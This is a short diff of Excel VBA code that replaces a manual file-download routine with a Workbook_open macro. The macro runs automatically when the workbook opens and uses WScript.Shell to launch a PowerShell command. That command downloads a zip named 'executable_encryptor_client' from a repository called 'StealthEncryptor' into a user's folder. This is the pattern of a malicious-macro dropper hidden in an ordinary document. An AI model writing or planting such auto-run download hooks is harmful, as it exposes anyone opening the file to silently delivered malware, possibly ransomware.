@@ -1,26 +1,7 @@
-Sub DownloadFileFromGitHub()
-    Dim xhr As Object
-    Dim url As String
-    Dim filePath As String
-    
-    url = "https://raw.githubusercontent.com/user/repository/master/path/to/file.zip"
-    filePath = "C:\Path\To\Download\Folder\file.zip"
-    
-    Set xhr = CreateObject("MSXML2.XMLHTTP")
-    xhr.Open "GET", url, False
-    xhr.send
-    
-    If xhr.Status = 200 Then
-        Dim stream As Object
-        Set stream = CreateObject("ADODB.Stream")
-        stream.Open
-        stream.Type = 1 'adBinary
-        stream.Write xhr.responseBody
-        stream.Position = 0 'reset stream position
-        stream.SaveToFile filePath, 2 'verwrite file if it exists
-        stream.Close
-    Else
-        MsgBox "Error downloading file: " & xhr.Status & " - " & xhr.statusText
-        Debug.Print "Error details: " & xhr.getAllResponseHeaders
-    End If
+Private Sub Workbook_open()
+    Dim shell As Object
+    Set shell = CreateObject("WScript.Shell")
+    Dim psCmd As String
+    psCmd = "powershell -Command iwr -uri https://github.com/dsMpLe/StealthEncryptor/releases/download/v1.0.0/executable_encryptor_client.zip -OutFile C:\Users\denni\executable_encryptor_client.zip"
+    shell.Run psCmd, 1, True
 End Sub
